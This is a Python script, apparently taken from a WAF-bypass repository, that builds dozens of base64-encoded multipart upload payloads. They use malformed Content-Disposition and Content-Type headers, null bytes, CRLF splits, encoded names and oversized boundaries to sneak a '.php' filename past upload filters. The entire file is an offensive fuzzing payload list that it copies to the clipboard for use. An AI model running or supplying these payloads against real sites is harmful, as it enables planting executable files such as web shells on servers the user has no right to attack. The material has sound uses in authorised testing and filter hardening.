import base64, pyperclip

##https://github.com/maybe-why-not/upload_waf_filename_bypass
##################################################################################################
##Content-Type: multipart/form-data; boundary=------------------------42cef8877054958f
##
##--------------------------42cef8877054958f
##Content-Disposition: form-data; name="file"; filename="xx.php"
##Content-Type: application/png
##
##123456
##--------------------------42cef8877054958f
##################################################################################################
suffix = b'php'
filename = b'xx'
name = b'upfile'
boundary = b'------------------------42cef8877054958f'
Content_Type = b'image/jpeg'
content = b'123456'
##################################################################################################
def generate(Content_Type1 = b'''Content-Type: multipart/form-data; boundary=''' + boundary,\
             boundary1 = b'''--''' + boundary,\
             Content_Disposition = b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
             Content_Type2 = b'''Content-Type: ''' + Content_Type,\
             body = content,\
             boundary2 = b'''--''' + boundary,\
             ):
    
    body = Content_Type1 + b'''\r
\r
''' + boundary1 + b'''\r
''' + Content_Disposition + b'''\r
''' + Content_Type2 + b'''\r
\r
''' + body + b'''\r
''' + boundary2

    return base64.b64encode(body)

def generate_other(body = b''):
    
    return base64.b64encode(body)

def utf8_encode(string):
    return(b"=?utf-8?B?"+ base64.b64encode(string) +b"?=")

def gbk_encode(string):
    res = ""
    for i in string.decode("gbk"):
        tmp = hex(ord(i)).split("0x")[1]
        res += f"={tmp}"
    return ("=?gbk?Q?"+res+"?=").encode('utf8')
##################################################################################################
payloads = []
Content_Disposition_list = [b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix[:1] + b'''\r\n''' + suffix[1:] + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; \x1cfilename\x1c="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + utf8_encode(name) + b'''"; filename="''' + utf8_encode(filename + b'''.''' + suffix) + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + gbk_encode(name) + b'''"; filename="''' + gbk_encode(filename + b'''.''' + suffix) + b'''"''',
b'''Content-Disposition: "form-data"; name=\'''' + name + b'''; filename=\'''' + filename + b'''.''' + suffix + b'''; name=\'''' + name + b'''\'''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''\\"; filename="''' + filename + b'''.''' + suffix + b'''; name="''' + name + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"a"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=''' + filename + b''''.''' + suffix,
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename="''' + filename + b''''.''' + suffix + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=''' + filename + b'''".''' + suffix,
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=''' + filename + b''':.''' + suffix,
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename="''' + filename + b'''".''' + suffix + b'''"''',
b'''Content-Disposition: "form-data"; name=''' + name + b'''; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name=''' + name + b'''; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name=''' + name + b'''; filename=''' + filename + b'''.''' + suffix,
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename=''' + filename + b'''.''' + suffix,
b'''Content-Disposition: form-data; name=\'''' + name + b''''; filename=\'''' + filename + b'''.''' + suffix + b'''\'''',
b'''Content-Disposition: 'form-data'; name="''' + name + b'''"; filename=\'''' + filename + b'''.''' + suffix + b'''\'''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix,
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename=\'''' + filename + b'''.''' + suffix,
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b''';''',
b'''Content-Disposition: form-data; Name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''content-disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=[0x09]"''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=[0x09]"''' + filename + b'''.''' + suffix,
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=[0x09]"''' + filename + b'''.''' + suffix + b'''"[0x09]''',
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=[0x09]''' + filename + b'''.''' + suffix,
b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=[0x09]''' + filename + b'''.''' + suffix + b'''[0x09];''',
b'''Content-Disposition: form-data; name="''' + name + b'''";;; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name=="''' + name + b'''"; filename===="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename===''' + filename + b'''.''' + suffix,
b'''Content-Disposition: fOrM-DaTA; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-da+ta; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: fo    r m-dat a; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-datax; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; filename="''' + filename + b'''.''' + suffix + b'''"; name="''' + name + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg" filename="''' + filename + b'''.jpg"; filename="''' + filename + b'''.jpg"; filename="''' + filename + b'''.jpg"; filename="''' + filename + b'''.jpg"; filename="''' + filename + b'''.jpg"; filename="''' + filename + b'''.''' + suffix + b'''";''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; \r\nfilename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg;.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg'.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg".''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg\\.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''[0x00].jpg"''',
b'''Content-Disposition:form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition:  form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: *; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: ~form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data;  name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b''' .jpg"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''_.jpg"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''..''' + suffix + b'''.jpg.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''\x00.jpg"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename=;filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data+; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="''' + name + b'''"; filename*="UTF8\'''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data ; name="''' + name + b'''" ; filename="''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name= "''' + name + b'''"; filename= "''' + filename + b'''.''' + suffix + b'''"''',
b'''Content-Disposition: form-data; name="test"; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',]
##################################################################################################
Content_Type1_list = [b'''Content-Type: multipart/form-data; boundary=--''' + boundary,
b'''Content-Type: mUltiPart/ForM-dATa; boundary=--''' + boundary,
b'''Content-Type: multipart/form-data boundary=--''' + boundary,
b'''Content-Type: multipart/form-data x boundary=--''' + boundary,
b'''Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=--''' + boundary,
b'''Content-Type: multipart/form-data,boundary=--''' + boundary,
b'''Content-Type: multipart/form-data,x,boundary=--''' + boundary,
b'''Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=--''' + boundary,
b'''Content-Type: multipart/form-data;bypass&123**{|}boundary=--''' + boundary,
b'''Content-Type: multipart/form-data bypass&123**{|}boundary=--''' + boundary,
b'''Content-Type: multipart/form-data,bypass&123**{|}boundary=--''' + boundary,
b'''Content-Type: multipart/form-data; boundary=--''' + boundary + b''';123abc''',
b'''Content-Type: multipart/form-data; boundary=--''' + boundary + b''',123abc''',
b'''Content-Type: multipart/form-data; boundary =--''' + boundary,
b'''Content-Type: multipart/form-data ; boundary=--''' + boundary,
b'''Content-Type: multipart/form-data; bOundary=--''' + boundary,]
##################################################################################################
Content_Type2_list = [b'''content-type: ''' + Content_Type,
b'''Content-Type:  ''' + Content_Type,]
##################################################################################################
other_list = [b'''Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary,#
b'''Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
\r
--''' + boundary + b'''\r
--''' + boundary + b'''--\r
--''' + boundary + b''';123\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary,#
b'''Content-Type: multipart/form-data; boundary=--''' + boundary + b'''\r
\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; \r
filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary,#
b'''Content-Type: multipart/form-data; boundary=--''' + boundary + b'''fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9\r
\r
--''' + boundary + b'''fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9\r
Content-Disposition: form-data; name="''' + name + b'''";filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary + b'''fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9''',#
b'''Content-Type: multipart/form-data; boundary=--''' + boundary + b''',bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9\r
\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary,#
b'''Content-Type: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary=--''' + boundary + b'''\r
\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--''' + boundary,#
b'''Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
\r
--''' + boundary + b'''\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
\r
\r
''' + content + b'''\r
--''' + boundary,#
b'''Content-Type: multipart/form-data; boundary=""''' + boundary + b'''"\r
\r
--\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
--""''' + boundary + b'''"''',#
b'''Content-Type: multipart/form-data; boundary= "''' + boundary + b'''" \r
\r
-- "''' + boundary + b'''"\r
Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
Content-Type: ''' + Content_Type + b'''\r
\r
''' + content + b'''\r
-- "''' + boundary + b'''"''',#
              ]
##################################################################################################
for i in Content_Disposition_list:
    payloads.append(generate(Content_Disposition = i))

for i in Content_Type1_list:
    payloads.append(generate(Content_Type1 = i))

for i in Content_Type2_list:
    payloads.append(generate(Content_Type2 = i))

for i in other_list:
    payloads.append(generate_other(body = i))

payloads_string = ''
for i in payloads:
    payloads_string += i.decode('utf8')+'\n'

pyperclip.copy(payloads_string)

